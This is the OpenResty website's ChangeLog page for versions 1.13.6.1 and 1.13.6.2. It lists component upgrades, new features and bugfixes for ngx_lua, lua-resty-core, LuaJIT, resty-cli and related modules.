=== Content from openresty.org_71d25de2_20250125_155954.html ===


[![](/images/logo.png)](.)

[OpenResty®](.)
Scalable Web Platform by Extending NGINX with Lua

[![](/images/ico-github.png)
Contribute on GitHub](https://github.com/openresty/ "Contribute on GitHub")
[![](/images/flarum.png)
Official Forum](https://forum.openresty.us/ "Official Forum")
[![](/images/rocket.svg)
Try OpenResty XRay](https://openresty.com/en/xray/request-demo/?src=org_top "Try OpenResty XRay")

![](/images/search.svg)
OpenResty XRay

Advanced observability built for OpenResty and more

[OpenResty XRay Live Demo →](https://demo.xray.openresty.com/targets/)

×

---

limited time offer

---

Request
TRIAL
 today and receive a diagnostic
REPORT

Submit
Learn more

* **[Blog](https://blog.openresty.com/en/?src=org_side "Blog")**
* **[Download](download.html "Download")**
* [Installation](installation.html "Installation")
* [YouTube Channel](https://www.youtube.com/channel/UCXVmwF-UCScv2ftsGoMqxhw/ "YouTube Channel")
* [Video Tutorials](videos.html "Video Tutorials")
* [Enterprise Solutions](commercial.html "Enterprise Solutions")
* [Getting Started](getting-started.html "Getting Started")
* [Upgrading](upgrading.html "Upgrading")
* [Changes](changes.html "Changes")
* [Events](events.html "Events")
* [Components](components.html "Components")
* [Community](community.html "Community")
* [Benchmark](benchmark.html "Benchmark")
* [Contact us](contact-us.html "Contact us")
* [Debugging](debugging.html "Debugging")
* [Donate Online](donate-online.html "Donate Online")
* [Donors](donors.html "Donors")
* [eBooks](ebooks.html "eBooks")
* [FAQ](faq.html "FAQ")
* [Getting Involved](getting-involved.html "Getting Involved")
* [Presentations](presentations.html "Presentations")
* [Profiling](profiling.html "Profiling")
* [Quality Assurance](quality-assurance.html "Quality Assurance")
* [Resources](resources.html "Resources")
* [Samples](samples.html "Samples")
* [User Survey](https://openresty.org/survey/ "User Survey")
* [About](about.html "About")
* [中文站](/cn/ "中文站")
* [OpenResty.com](https://openresty.com/ "OpenResty.com")

[![](../images/logo.png)](ann-1027001001.html)
**New!**[OpenResty 1.27.1.1](ann-1027001001.html) is now released!

[![](../images/logo.png)](ann-1025003002.html)
**New!**[OpenResty 1.25.3.2](ann-1025003002.html) is now released!

[![](../images/header-images/en-python-high-disk.jpg)](https://blog.openresty.com/en/python-high-disk/?src=org_news)
**New!** New blog post [Pinpointing the Python Code Paths with High Disk I/O (using OpenResty XRay)](https://blog.openresty.com/en/python-high-disk/?src=org_news) is published.

[![](../images/header-images/en-php-exceptions.jpg)](https://blog.openresty.com/en/php-exceptions/?src=org_news)
**New!** New blog post [How to Trace Exceptions inside PHP Applications (using OpenResty XRay)](https://blog.openresty.com/en/php-exceptions/?src=org_news) is published.

[![](../images/header-images/en-xray-agent-install-k8s.jpg)](https://blog.openresty.com/en/xray-agent-install-k8s/?src=org_news)
**New!** New blog post [Install OpenResty XRay’s Agents on Kubernetes cluster](https://blog.openresty.com/en/xray-agent-install-k8s/?src=org_news) is published.

[![](../images/header-images/en-edge-k8s-autoapprove.jpg)](https://blog.openresty.com/en/edge-k8s-autoapprove/?src=org_news)
**New!** New blog post [How to Automate Managing Gateway Servers in K8s Environment (using OpenResty Edge)](https://blog.openresty.com/en/edge-k8s-autoapprove/?src=org_news) is published.

[![](../images/header-images/en-edge-lua-ext.jpg)](https://blog.openresty.com/en/edge-lua-ext/?src=org_news)
**New!** New blog post [Use Lua Extensions to Respond to Gateway Server Offline Events in OpenResty Edge](https://blog.openresty.com/en/edge-lua-ext/?src=org_news) is published.

[![](../images/header-images/en-rust-high-disk.jpg)](https://blog.openresty.com/en/rust-high-disk/?src=org_news)
**New!** New blog post [Pinpointing the Hottest Rust Code Paths with High Disk I/O (using OpenResty XRay)](https://blog.openresty.com/en/rust-high-disk/?src=org_news) is published.

## ChangeLog 1.13.6

Yichun Zhang (agentzh)
,
14 May 2018 (created 13 Nov 2017)

# Version 1.13.6.2 - 14 May 2018

* win64: distributing official 64-bit Windows binary packages for OpenResty using the MSYS2/MinGW toolchain.
* win32: now we build our official 32-bit Windows binary packages for OpenResty using the MSYS2/MinGW toolchain.
* win32: upgraded pcre to 8.42 and openssl to 1.1.0h.
* optimize: now the openresty build system (`./configure`) automatically patches the resty command-line utility to use its own [nginx](nginx.html "nginx") binary so that it does not have to compute it at runtime (which is a bit expensive). this saves about 10ms (from for total 20ms to 10ms) for resty's startup time, as measured on a mid-2015 MBP. That's 50% reduction in total startup time! Yay!
* win32/win64: enabled [ngx\_stream\_ssl\_preread\_module](http://nginx.org/en/docs/stream/ngx_stream_ssl_preread_module.html "ngx_stream_ssl_preread_module") in our binary builds.
* bugfix: ./configure: relative paths in --add-dynamic-module=PATH option did not work. thanks catatsuy for the patch.
* feature: added a patch for the [nginx](nginx.html "nginx") core to add the `local=on` and `local=/path/to/resolv.conf` options to the standard "resolver" config directive. This can enable the use of system-level nameserver configurations of /etc/resolv.conf, for example, in nginx's own nonblocking DNS resolver. thanks Datong Sun for the patch.
* feature: added the `socket_cloexec` patch to ensure most of the [nginx](nginx.html "nginx") connections could be closed before child process terminates. thanks spacewander for the patch.
* feature: added patches to the [nginx](nginx.html "nginx") core to make sure [ngx\_stream\_ssl\_preread\_module](http://nginx.org/en/docs/stream/ngx_stream_ssl_preread_module.html "ngx_stream_ssl_preread_module") will not skip the rest of the preread phase when SNI server name parsing was successful. thanks Datong Sun for the patch.
* feature: ./configure: updated the stream subsystem related options from [nginx](nginx.html "nginx") 1.13.6. thanks hy05190134 for the patch.
* feature: added the SSL `sess_set_get_cb` yielding support patch for OpenSSL 1.1.0d and beyond. thanks spacewander for the patch.
* feature: applied the `init_cycle_pool_release` patch to [nginx](nginx.html "nginx") 1.13.6+ cores to make it valgrind or asan clean.
* bugfix: we incorrectly removed the existing Makefile even for `./configure --help`. thanks spacewander for the patch.
* feature: added information about OpenResty's commercial support in the default index.html page.
* opm: doc index: updated the LuaJIT 2.1's official docs to the latest version.
* upgraded [resty-cli](https://github.com/openresty/resty-cli#readme "resty-cli") to 0.21.

  + resty: got rid of prerequisite perl modules to improve startup time. Startup time has been significantly reduced on `*NIX` systems. No improvment on Win32 though. On my mid-2015 MBP, the `resty -e "print(1)"` command's total time can drop from ~36ms to ~10ms.

  \*bugfix: when the signal is received but the child process is already gone, resty incorrectly returned non-zero return code and output "No such process" error. thanks Datong Sun for the patch.
* upgraded [opm](https://github.com/openresty/opm#readme "opm") to 0.0.5.

  + bugfix: [opm](https://github.com/openresty/opm#readme "opm") get: curl via HTTP proxies would complain about "bad response status line received". The first "Connection established" response might not come with any response header entries at all.
* upgraded [ngx\_lua](https://github.com/openresty/lua-nginx-module#readme "ngx_lua") to 0.10.13.

  + feature: [ngx.req.get\_post\_args()](https://github.com/openresty/lua-nginx-module#ngxreqget_post_args "ngx.req.get_post_args()"), [ngx.req.get\_uri\_args()](https://github.com/openresty/lua-nginx-module#ngxreqget_uri_args "ngx.req.get_uri_args()"), [ngx.req.get\_headers()](https://github.com/openresty/lua-nginx-module#ngxreqget_headers "ngx.req.get_headers()"), [ngx.resp.get\_headers()](https://github.com/openresty/lua-nginx-module#ngxrespget_headers "ngx.resp.get_headers()"), and [ngx.decode\_args()](https://github.com/openresty/lua-nginx-module#ngxdecode_args "ngx.decode_args()") now would return an error string, "truncated", when the input exceeds the `max_args`/`max_headers` limits.
  + feature: added support for the OpenSSL 1.1.0 serires. thanks Alessandro Ghedini for the original patch and the subsequent polishment work from Dejiang Zhu and spacewander.
  + feature: added the `init_ttl` argument to the pure C function for the [shdict:incr](https://github.com/openresty/lua-nginx-module#ngxshareddictincr "shdict:incr")() API. thanks Thibault Charbonnier for the patch.
  + feature: added support for the 308 status code in [ngx.redirect()](https://github.com/openresty/lua-nginx-module#ngxredirect "ngx.redirect()"). thanks Mikhail Senin for the patch.
  + feature: ssl: support enabling TLSv1.3 via the [lua\_ssl\_protocols](https://github.com/openresty/lua-nginx-module#lua_ssl_protocols "lua_ssl_protocols") config directive. thanks Alessandro Ghedini for the patch.
  + feature: `ngx_http_lua_ffi_set_resp_header()`: now add an override flag argument to control whether to override existing resp headers. this feature is required by the new [ngx.resp](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/resp.md#readme "ngx.resp") module's `add_header()` Lua API (in lua-resty-core). thanks spacewander for the patch.
  + feature: allowed sending boolean and nil values in cosockets. thanks spacewander for the patch.
  + feature: api.h: exposed the `ngx_http_lua_ffi_str_t` C data type for other [Nginx](nginx.html "Nginx") C modules.
  + feature: logged the tcp cosocket's remote end address when [tcpsock:connect()](https://github.com/openresty/lua-nginx-module#tcpsockconnect "tcpsock:connect()") times out and `lua_socket_log_errors` is on. This feature makes debug connect timeout errors easier, since domain name may map to different ip address in different time. thanks spacewander for the patch.
  + bugfix: [ngx.resp.get\_headers()](https://github.com/openresty/lua-nginx-module#ngxrespget_headers "ngx.resp.get_headers()"): the `max_headers` limit did not cover builtin headers.
  + bugfix: `ngx_http_lua_ffi_ssl_set_serialized_session()`: avoided memory leak when calling it repeatly.
  + bugfix: we now throw a Lua exception when [ngx.location.capture\*](https://github.com/openresty/lua-nginx-module#ngxlocationcapture "ngx.location.capture*") Lua API is used inside an HTTP2 request since it is known to lead to hanging.
  + bugfix: [nginx](nginx.html "nginx") rewrite directive may initiate internal redirects without clearing any module ctx and [rewrite\_by\_lua\*](https://github.com/openresty/lua-nginx-module#rewrite_by_lua "rewrite_by_lua*") handlers might think it was re-entered and thus it might lead to request hang. thanks twistedfall for the report.
  + bugfix: avoided sharing the same code object for identical Lua inlined code chunks in different phases due to chunk name conflicts. thanks yandongxiao for the report and spacewander for the patch.
  + bugfix: [ngx.req.raw\_header()](https://github.com/openresty/lua-nginx-module#ngxreqraw_header "ngx.req.raw_header()"): the first part of the header would be discarded when using single LF as delimiter and the number of headers is large enough. thanks tokers for the patch.
  + bugfix: pure C API for ngx.var assignment: we failed to output the error message length. this might lead to error buffer overreads. thanks Ka-Hing Cheung for the patch.
  + bugfix: the upper bound of port ranges should be 65535 instead of 65536. thanks spacewander for the patch.
  + bugfix: we did not always free up all connections when cleaning up socket pools. thanks spacewander for the patch.
  + bugfix: use of lua-resty-core's [ngx.re](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/re.md#readme "ngx.re") API in [init\_by\_lua\*](https://github.com/openresty/lua-nginx-module#init_by_lua "init_by_lua*") might lead to memory issues during [nginx](nginx.html "nginx") HUP reload when no [lua\_shared\_dict](https://github.com/openresty/lua-nginx-module#lua_shared_dict "lua_shared_dict") directives are used and the regex cache is enabled.
  + change: switched to `SSL_version()` calls from `TLS1_get_version()`. `TLS1_get_version` is a simple wrapper for `SSL_version` that returns 0 when used with DTLS. However, it was removed from BoringSSL in 2015 so instead use `SSL_version` directly. Note: BoringSSL is never an officially supported target for this module. `ngx_http_lua_ffi_ssl_get_tls1_version` can never be reached with DTLS so the behaviour is the same. thanks Tom Thorogood for the patch.
  + optimize: switched exptime argument type to 'long' in the shdict [FFI](http://luajit.org/ext_ffi.html "FFI") API to mitigate potential overflows. thanks Thibault Charbonnier for the patch.
  + optimize: avoided the string copy in `ngx_http_lua_ffi_req_get_method_name()`.
  + optimize: corrected the initial table size of req socket objects. thanks spacewander for the patch.
  + optimize: destroy the Lua VM and avoid running any [init\_worker\_by\_lua\*](https://github.com/openresty/lua-nginx-module#init_worker_by_lua "init_worker_by_lua*") code inside cache helper processes. thanks spacewander for the patch.
  + doc: fixed an error message typo in `set_der_priv_key()`. thanks Tom Thorogood for the patch.
  + doc: mentioned that OpenResty includes its own version of LuaJIT which is specifically optmized and enhanced for OpenResty.
  + doc: some typo fixes from hongliang.
  + doc: setting ngx.header.HEADER no longer throws out an exception when the header is already sent out; it now just logs an error message. thanks yandongxiao for the patch.
  + doc: typo fixes from yandongxiao.
  + doc: typo fixes from tan jinhua.
  + doc: fixed a typo in a code comment. thanks Alex Zhang for the patch.
* upgraded [lua-resty-core](https://github.com/openresty/lua-resty-core#readme "lua-resty-core") to 0.1.15.

  + feature: implemented [ngx.resp](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/resp.md#readme "ngx.resp") module and its function add\_header(). The [ngx.resp](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/resp.md#readme "ngx.resp") module's `add_header` works like the `add_header` [Nginx](nginx.html "Nginx") directive. Unlike the `ngx.header.HEADER=` API, this method appends new header to the old one instead of overriding any existing ones. Unlike the `add_header` directive, this method overrides the builtin header instead of appending to it. thanks spacewander for the patch.
  + feature: the [FFI](http://luajit.org/ext_ffi.html "FFI") version of the [ngx.req.get\_uri\_args()](https://github.com/openresty/lua-nginx-module#ngxreqget_uri_args "ngx.req.get_uri_args()") and [ngx.req.get\_headers()](https://github.com/openresty/lua-nginx-module#ngxreqget_headers "ngx.req.get_headers()") API functions now would return an error string, "truncated", when the input exceeds the `max_args`/`max_headers` limits.
  + bugfix: [ngx.re](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/re.md#readme "ngx.re"): fixed a `split()` corner case when successtive separator characters are at the end of the subject string.
  + bugfix: shdict: switched exptime argument type to 'long' to mitigate potential overflows.
  + bugfix: [ngx.ssl.session](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/ssl/session.md#readme "ngx.ssl.session"): avoided memory leaks when calling set\_serialized\_session repeatly. thanks spacewander for the patch.
  + optimize: avoided an extra string copy in [ngx.req](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/req.md#readme "ngx.req").get\_method(). thanks spacewander for the patch.
  + change: replaced `return error()` with `error()` to avoid stack unwinding upon Lua exceptions. this should give much better Lua backtrace for the errors. thanks spacewander for the patch.
  + bugfix: [ngx.re](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/re.md#readme "ngx.re"): fixed a split() edge-case when using control characters in the regex. thanks Thibault Charbonnier for the patch.
  + feature: [shdict:incr](https://github.com/openresty/lua-nginx-module#ngxshareddictincr "shdict:incr")(): added the "init\_ttl" argument to set the ttl of values when they are first created via the "init" argument. thanks Thibault Charbonnier for the patch.
  + feature: re-implemented the remaining time related Lua APIs with [FFI](http://luajit.org/ext_ffi.html "FFI") (like ngx.update\_time, ngx.http\_time, ngx.parse\_http\_time, and etc.). thanks spacewander for the patch.
  + feature: [ngx.errlog](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/errlog.md#readme "ngx.errlog"): added the raw\_log() API function to allow the building of custom logging facilities. thanks Thibault Charbonnier for the patch.
  + feature: added new API function `get_master_pid()` to the [ngx.process](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/process.md#readme "ngx.process") module. thanks chronolaw for the patch.
  + doc: typo fixes from chronolaw.
  + feature: added new resty.core.phase module to include the pure [FFI](http://luajit.org/ext_ffi.html "FFI") version of the [ngx.get\_phase()](https://github.com/openresty/lua-nginx-module#ngxget_phase "ngx.get_phase()") API. thanks Robert Paprocki for the patch.
  + feature: added new ngx.base64 Lua module with the functions encode\_base64url() and decode\_base64url(). thanks Datong Sn for the patch.
  + bugfix: resty.core.var: ngx.var.VAR assignment might over-read the error msg buffer. thanks Ka-Hing Cheung for the patch.
  + optimize: use plain text [string.find](http://www.lua.org/manual/5.1/manual.html#pdf-string.find "string.find") calls when we mean it.
  + feature: [ngx.ssl](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/ssl.md#readme "ngx.ssl"): added new raw\_client\_addr() Lua API function. thanks 王军伟 for the patch.
* upgraded [lua-cjson](https://github.com/openresty/lua-cjson#readme "lua-cjson") to 2.1.0.6.

  + optimize: improved forward-compatibility with older versions of Lua/LuaJIT. thanks Thibault Charbonnier for the patch.
  + bugfix: fixed the C compiler warning "SO C90 forbids mixed declarations and code" on older operating systems.
  + feature: set `cjson.array_mt` on decoded JSON arrays. this can be turned on via `cjson.decode_array_with_array_mt(true)`. off by default for backward compatibility. thanks Thibault Charbonnier for the patch.
  + feature: added new cjson.array\_mt metatable to allow enforcing JSON array encoding. thanks Thibault Charbonnier for the patch.
  + bugfix: fixed a -Wsign-compare compiler warning. thanks gnought for the patch.
* upgraded [lua-resty-lrucache](https://github.com/openresty/lua-resty-lrucache#readme "lua-resty-lrucache") to 0.08.

  + feature: added new method flush\_all() to flush all the data in an existing cache object. thanks yang.yang for the patch.
* upgraded [lua-resty-dns](https://github.com/openresty/lua-resty-dns#readme "lua-resty-dns") to 0.21.

  + refactor: cleaned up some variable names and locals. thanks Thijs Schreijer for the patch.
  + bugfix: fixed issues with retrans not being honoured upon connection failures. thanks Thijs Schreijer for the patch.
  + feature: improved error reporting, making it more precise, and returning errors of previous tries. thanks Thijs Schreijer for the patch.
  + bugfix: fix parsing state after SOA record. Correct parsing of Additional Records failed due to a bad parsing state after processing a SOA record in the Authorative nameservers section. DNS response based on "dig @ns1.google.com SOA google.com". thanks Peter Wu for the patch.
  + bugfix: fix typo in SOA record field "minimum". Rename "mininum" to "minimum", fixes issue in original feature added with [lua-resty-dns](https://github.com/openresty/lua-resty-dns#readme "lua-resty-dns") v0.19rc1.
* upgraded lua-resty-string to 0.11.

  + feature: resty.aes: added compaibility with OpenSSL 1.1.0+. thanks spacewander for the patch.
* upgraded [ngx\_stream\_lua](https://github.com/openresty/stream-lua-nginx-module#readme "ngx_stream_lua") to 0.0.5.

  + feature: we now have raw request downstream cosocket support for scripting UDP servers. thanks Datong Sun for the patch.
  + feature: added the preread handler postponing feature. thanks Datong Sun for the patch.
  + feature: added new config directive lua\_add\_variable to allow adding changeable. thanks Datong Sun for the patch.
* upgraded [ngx\_set\_misc](https://github.com/openresty/set-misc-nginx-module#readme "ngx_set_misc") to 0.32.

  + bugfix: [set\_quote\_pgsql\_str](https://github.com/openresty/set-misc-nginx-module#set_quote_pgsql_str "set_quote_pgsql_str"): we did not escape the `$` character. thanks Yuansheng Wang for the patch.
  + refactor: made `ngx_http_pg_utf_islegal()` much better.
  + bugfix: fixed the `-Wimplicit-fallthrough` warinings from GCC 7. thanks Andrei Belov for the patch.
* upgraded [ngx\_redis2](https://github.com/openresty/redis2-nginx-module#readme "ngx_redis2") to 0.15.

  + bugfix: `ragel -G2` genreates C code which results in `-Werror=implicit-fallthrough` compilation errors at least with gcc 7.2. switched to `ragel -T1` instaed.
* upgraded [ngx\_memc](https://github.com/openresty/memc-nginx-module#readme "ngx_memc") to 0.19

  + bugfix: `ragel -G2` genreates C code which results in `-Werror=implicit-fallthrough` compilation errors at least with gcc 7.2. switched to `ragel -T1` instaed.
* upgraded [ngx\_encrypted\_session](https://github.com/openresty/encrypted-session-nginx-module#readme "ngx_encrypted_session") to 0.08.

  + feature: added support for OpenSSL 1.1.0. thanks spacewander for the patch.
* upgraded [ngx\_rds\_csv](https://github.com/openresty/rds-csv-nginx-module#readme "ngx_rds_csv") to 0.09.

  + bugfix: fixed the `-Werror=implicit-fallthrough` compilation errors at least with gcc 7.2.
* upgraded [ngx\_drizzle](https://github.com/openresty/drizzle-nginx-module#readme "ngx_drizzle") to 0.1.11.

  + bugfix: fixed the `-Werror=implicit-fallthrough` compilation errors at least with gcc 7.2.
* upgraded ngx\_xss to 0.06.

  + bugfix: `ragel -G2` genreates C code which results in `-Werror=implicit-fallthrough` compilation errors at least with gcc 7.2. switched to `ragel -T1` instaed.
  + bugfix: fixed errors and warnings with C compilers without variadic macro support.
* upgraded LuaJIT to 2.1-20180419: [https://github.com/openresty/luajit2/tags](https://github.com/openresty/luajit2/tags "https://github.com/openresty/luajit2/tags")

  + feature: implemented new API function `jit.prngstate()` for reading or setting the current PRNG state number used in the JIT compiler.
  + feature: implemented the table.clone() builtin Lua API. This change only support shallow clone. e.g

    local tab\_clone = require "table.clone"
    local x = {x=12, y={5, 6, 7}}
    local y = tab\_clone(x)
    -- ... use y here ...

  We observed 7% over-all speedup in the edgelang-fan compiler's compiling speed whose Lua is generated by the fanlang compiler. thanks Shuxin Yang for the patch and OpenResty Inc. for sponsoring this work.

  + imported Mike Pall's latest changes:
    - DynASM/x86: Add BMI1 and BMI2 instructions.
    - Fix rechaining of pseudo-resurrected string keys.
    - Clear stack after `print_jit_status()` in CLI.
    - Fix GCC 7 `-Wimplicit-fallthrough` warnings.
    - [FFI](http://luajit.org/ext_ffi.html "FFI"): Don't assert on `#1LL` (Lua 5.2 compatibility mode only).
    - MIPS64: Fix soft-float +-0.0 vs. +-0.0 comparison.
    - Fix LuaJIT API docs for `LUAJIT_MODE_*`.
    - Fix ARMv8 (32 bit subset) detection.
    - Fix `string.format("%c", 0)`.
    - Fix `IR_BUFPUT` assembly.
    - MIPS64: Fix `xpcall()` error case.
    - ARM64: Fix `xpcall()` error case.
    - Fix saved bytecode encapsulated in ELF objects.
    - MIPS64: Fix register allocation in assembly of HREF.
    - ARM64: Fix assembly of HREFK.
    - Fix FOLD rule for strength reduction of widening.

# Version 1.13.6.1 - 13 November 2017

* upgraded the [Nginx](nginx.html "Nginx") core to 1.13.6.
  + see the changes here: [http://nginx.org/en/CHANGES](http://nginx.org/en/CHANGES "http://nginx.org/en/CHANGES")
* bundled the new component, [ngx\_stream\_lua\_module](https://github.com/openresty/stream-lua-nginx-module "ngx_stream_lua_module") 0.0.4, which is also enabled by default. One can disable this 3rd-party [Nginx](nginx.html "Nginx") C module by passing `--without-stream_lua_module` to the `./configure` script. We provide compatible Lua API with [ngx\_lua](https://github.com/openresty/lua-nginx-module#readme "ngx_lua") wherever it makes sense. Currently we support [content\_by\_lua\*](https://github.com/openresty/lua-nginx-module#content_by_lua "content_by_lua*"), preread\_by\_lua\* (similar to [ngx\_lua](https://github.com/openresty/lua-nginx-module#readme "ngx_lua")'s [access\_by\_lua\*](https://github.com/openresty/lua-nginx-module#access_by_lua "access_by_lua*") ), [log\_by\_lua\*](https://github.com/openresty/lua-nginx-module#log_by_lua "log_by_lua*"), and [balancer\_by\_lua\*](https://github.com/openresty/lua-nginx-module#balancer_by_lua_block "balancer_by_lua*") in the stream subsystem. thanks Mashape Inc. for sponsoring the [OpenResty Inc.](https://openresty.com "OpenResty Inc.") team to do the development work on rewriting [ngx\_stream\_lua](https://github.com/openresty/stream-lua-nginx-module#readme "ngx_stream_lua") for recent [nginx](nginx.html "nginx") core version.
* change: applied a patch to the [nginx](nginx.html "nginx") core to make sure the "server" header in HTTP/2 response shows "openresty" when the `server_tokens` diretive is turned off.
* feature: added [nginx](nginx.html "nginx") core patches needed by [ngx\_stream\_lua\_module](https://github.com/openresty/stream-lua-nginx-module#readme "ngx_stream_lua_module")'s [balancer\_by\_lua\*](https://github.com/openresty/lua-nginx-module#balancer_by_lua_block "balancer_by_lua*").
* win32: upgraded PCRE to 8.41.
* upgraded [ngx\_lua](https://github.com/openresty/lua-nginx-module#readme "ngx_lua") to 0.10.11.
  + feature: shdict: added pure C API for getting free page size and total capacity for [lua-resty-core](https://github.com/openresty/lua-resty-core#readme "lua-resty-core"). thanks Hiroaki Nakamura for the patch.
  + feature: added pure C functions for [shdict:ttl](https://github.com/openresty/lua-nginx-module#ngxshareddictttl "shdict:ttl")() and [shdict:expire](https://github.com/openresty/lua-nginx-module#ngxshareddictexpire "shdict:expire")() API functions. thanks Thibault Charbonnier for the patch.
  + bugfix: `*_by_lua_block` directives might break [nginx](nginx.html "nginx") config dump (`-T` switch). thanks Oleg A. Mamontov for the patch.
  + bugfix: segmentation faults might happen when pipelined http requests are used in the downsteram connection. thanks Gao Yan for the report.
  + bugfix: the ssl connections might be drained and reused prematurely when [ssl\_certificate\_by\_lua\*](https://github.com/openresty/lua-nginx-module#ssl_certificate_by_lua_block "ssl_certificate_by_lua*") or [ssl\_session\_fetch\_by\_lua\*](https://github.com/openresty/lua-nginx-module#ssl_session_fetch_by_lua_block "ssl_session_fetch_by_lua*") were used. this might lead to segmentation faults under load. thanks guanglinlv for the report and the original patch.
  + bugfix: [tcpsock:connect()](https://github.com/openresty/lua-nginx-module#tcpsockconnect "tcpsock:connect()"): when the [nginx](nginx.html "nginx") resolver's `send()` immediately fails without yielding, we didn't clean up the coroutine ctx state properly. This might lead to segmentation faults. thanks xiaocang for the report and root for the patch.
  + bugfix: added fallthrough comment to silence GCC 7's `-Wimplicit-fallthrough`. thanks Andriy Kornatskyy for the report and spacewander for the patch.
  + bugfix: [tcpsock:settimeout](https://github.com/openresty/lua-nginx-module#tcpsocksettimeout "tcpsock:settimeout"), [tcpsock:settimeouts](https://github.com/openresty/lua-nginx-module#tcpsocksettimeouts "tcpsock:settimeouts"): throws an error when the timeout argument values overflow. Here we only support timeout values no greater than the max value of a 32 bits integer. thanks spacewander for the patch.
  + doc: added "413 Request Entity Too Large" to the possible short circuit response list. thanks Datong Sun for the patch.
* upgraded [lua-resty-core](https://github.com/openresty/lua-resty-core#readme "lua-resty-core") to 0.1.13.
  + feature: [ngx.balancer](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/balancer.md#readme "ngx.balancer") now supports the [ngx\_stream\_lua](https://github.com/openresty/stream-lua-nginx-module#readme "ngx_stream_lua"); also disabled all the other [FFI](http://luajit.org/ext_ffi.html "FFI") APIs for the stream subsystem for now.
  + feature: [resty.core.shdict](https://github.com/openresty/lua-resty-core/blob/master/lib/resty/core/shdict.md#readme "resty.core.shdict"): added new methods [shdict:free\_space](https://github.com/openresty/lua-nginx-module#ngxshareddictfree_space "shdict:free_space")() and [shdict:capacity](https://github.com/openresty/lua-nginx-module#ngxshareddictcapacity "shdict:capacity")(). thanks Hiroaki Nakamura for the patch.
  + feature: implemented the [ngx.re.gmatch](https://github.com/openresty/lua-nginx-module#ngxregmatch "ngx.re.gmatch") function with [FFI](http://luajit.org/ext_ffi.html "FFI"). thanks spacewander for the patch.
  + bugfix: [ngx.re](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/re.md#readme "ngx.re"): fix an edge-case where [re.split()](https://github.com/openresty/lua-resty-core/blob/master/lib/ngx/re.md#split "re.split()") might not destroy compiled regexes. thanks Thibault Charbonnier for the patch.
  + feature: implemented the [shdict:ttl](https://github.com/openresty/lua-nginx-module#ngxshareddictttl "shdict:ttl")() and [shdict:expire](https://github.com/openresty/lua-nginx-module#ngxshareddictexpire "shdict:expire")() API functions using [FFI](http://luajit.org/ext_ffi.html "FFI").
* upgraded [lua-resty-dns](https://github.com/openresty/lua-resty-dns#readme "lua-resty-dns") to 0.20.
  + feature: allows `RRTYPE` values larger than 255. thanks Peter Wu for the patch.
* upgraded [lua-resty-limit-traffic](https://github.com/openresty/lua-resty-limit-traffic#readme "lua-resty-limit-traffic") to 0.05.
  + feature: added new module [resty.limit.count](https://github.com/openresty/lua-resty-limit-traffic/blob/master/lib/resty/limit/count.md#readme "resty.limit.count") for GitHub API style request count limiting. thanks Ke Zhu for the original patch and Ming Wen for the followup tweaks.
  + bugfix: [resty.limit.traffic](https://github.com/openresty/lua-resty-limit-traffic/blob/master/lib/resty/limit/traffic.md#readme "resty.limit.traffic"): we might not uncommit previous limiters if a limiter got rejected while committing a state. thanks Thibault Charbonnier for the patch.
  + bugfix: [resty.limit.conn](https://github.com/openresty/lua-resty-limit-traffic/blob/master/lib/resty/limit/conn.md#readme "resty.limit.conn"): we incorrectly specified the exceeded connection count as the initial value for the shdict key decrement which may lead to dead locks when the key has been evicted in very busy systems. thanks bug had appeared in v0.04.
* upgraded [resty-cli](https://github.com/openresty/resty-cli#readme "resty-cli") to 0.20.
  + feature: resty: impelented the `-j off` option to turn off the JIT compiler.
  + feature: resty: implemented the `-j v` and `-j dump` options similar to luajit's.
  + feature: resty: added new command-line option `-l LIB` to mimic lua and luajit -l parameter. thanks Michal Cichra for the patch.
  + bugfix: resty: handle `SIGPIPE` ourselves by simply killing the process. thanks Ingy dot Net for the report.
  + bugfix: resty: hot looping Lua scripts failed to respond to the `INT` signal.
* upgraded [opm](https://github.com/openresty/opm#readme "opm") to 0.0.4.
  + bugfix: [opm](https://github.com/openresty/opm#readme "opm"): when curl uses HTTP/2 by default [opm](https://github.com/openresty/opm#readme "opm") would complain about "bad response status line received". thanks Donal Byrne and Andrew Redden for the report.
  + debug: [opm](https://github.com/openresty/opm#readme "opm"): added more details in the "bad response status line received from server" error.
* upgraded [ngx\_headers\_more](https://github.com/openresty/headers-more-nginx-module#readme "ngx_headers_more") to 0.33.
  + feature: add wildcard match support for [more\_clear\_input\_headers](https://github.com/openresty/headers-more-nginx-module#more_clear_input_headers "more_clear_input_headers").
  + doc: fixed [more\_clear\_input\_headers](https://github.com/openresty/headers-more-nginx-module#more_clear_input_headers "more_clear_input_headers") usage examples. thanks Daniel Paniagua for the patch.
* upgraded [ngx\_encrypted\_session](https://github.com/openresty/encrypted-session-nginx-module#readme "ngx_encrypted_session") to 0.07.
  + bugfix: fixed one potential memory leak in an error condition. thanks dyu for the patch.
* upgraded [ngx\_rds\_json](https://github.com/openresty/rds-json-nginx-module#readme "ngx_rds_json") to 0.15.
  + bugfix: fixed warnings with C compilers without variadic macro support.
  + doc: added context info for all the config directives.
* upgraded [ngx\_rds\_csv](https://github.com/openresty/rds-csv-nginx-module#readme "ngx_rds_csv") to 0.08.
  + tests: varous changes in the test suite.
* upgraded LuaJIT to v2.1-20171103: [https://github.com/openresty/luajit2/tags](https://github.com/openresty/luajit2/tags "https://github.com/openresty/luajit2/tags")
  + optimize: use more appressive JIT compiler parameters as the default to help large OpenResty Lua apps. We now use the following jit.opt defaults: `maxtrace=8000 maxrecord=16000 minstitch=3 maxmcode=40960 -- in KB`.
  + imported Mike Pall's latest changes:
    - `LJ_GC64`: Make `ASMREF_L` references 64 bit.
    - `LJ_GC64`: Fix ir\_khash for non-string GCobj.
    - DynASM/x86: Fix potential `REL_A` overflow. Thanks to Joshua Haberman.
    - MIPS64: Hide internal function.
    - x64/`LJ_GC64`: Fix type-check-only variant of SLOAD. Thanks to Peter Cawley.
